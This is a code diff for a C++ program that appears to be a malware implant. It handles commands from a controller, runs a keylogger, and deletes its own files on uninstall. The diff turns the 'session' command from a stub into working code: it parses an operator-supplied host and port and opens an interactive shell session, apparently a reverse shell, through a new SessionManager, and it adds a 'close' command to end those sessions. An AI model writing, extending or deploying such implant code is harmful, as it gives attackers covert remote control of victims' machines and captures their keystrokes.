@@ -3,6 +3,7 @@
 #include <cpppwn.hpp>
 #include <SQLiteCpp/SQLiteCpp.h>
 #include <filesystem>
+#include <netdb.h>
 #include <vector>
 #include <print>
 
@@ -11,6 +12,7 @@
 #include "Installer.hpp"
 #include "Config.hpp"
 #include "Payloads.hpp"
+#include "SessionManager.hpp"
 #include "Types.hpp"
 #include "Implant.hpp"
 
@@ -20,6 +22,7 @@
 int main(int argc, char* argv[]) {
     bool is_installation = false;
     Keylogger keylogger;
+    SessionManager sessionMan;
 
     // parse arguments
     for (int i = 1; i < argc; ++i) {
@@ -88,12 +91,19 @@ int main(int argc, char* argv[]) {
                 keylogger.stop();
                 res.result_data = "Keylogger stopped";
             } else if (cmd.command.starts_with("session")) {
-                logger::debug("Opening Interactive Shell Session");
-
-                // Open a reverse shell or interactive session
-                res.result_data = "Interactive session requested on port 4444";
+                const std::string& host = cmd.command.substr(8, cmd.command.find_last_of(" ") - 8);
+                const int port = std::stoi(cmd.command.substr(cmd.command.find_last_of(" ")));
+                logger::debug("Opening Interactive Shell Session: {} Port: {}", host, port);
+                sessionMan.start_session(generate_uuid(), host, port);
+                res.result_data = "Interactive session requested";
+            } else if (cmd.command.starts_with("close")) {
+                logger::debug("Closing all Interactive Shell Sessions");
+                sessionMan.stop_sessions();
+                res.result_data = "Interactive sessions closed";
             } else if (cmd.command.starts_with("uninstall")) {
                 logger::debug("Executing Uninstall Command");
+
+                //TODO: uninstall stuff
 
                 // Self-deletion logic
                 std::filesystem::remove(std::filesystem::current_path() / "identity.dat");
@@ -126,7 +136,6 @@ int main(int argc, char* argv[]) {
                     command_results.push_back(key_result);
                 }
             }
-
         }
 
         if (not running) {
